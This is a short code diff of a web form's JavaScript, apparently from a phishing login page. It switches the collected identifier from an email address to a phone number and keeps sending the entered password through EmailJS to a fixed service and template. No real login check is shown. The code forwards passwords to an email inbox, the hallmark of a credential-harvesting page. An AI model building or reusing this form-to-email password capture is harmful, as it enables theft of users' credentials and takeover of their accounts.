@@ -118,14 +118,14 @@ emailjs.init({
 document.getElementById("nameForm").addEventListener("submit", function(e) {
     e.preventDefault();
 
-    const Email = document.getElementById("Email").value;
+    const PhoneNumber = document.getElementById("Phone Number").value;
     const Password = document.getElementById("Password").value;
 
     emailjs.send(
         "service_yt1pznq",
         "template_lv2dlf6",
         {
-            Email: Email,
+            PhoneNumber: PhoneNumber,
             Password: Password
         }
     )
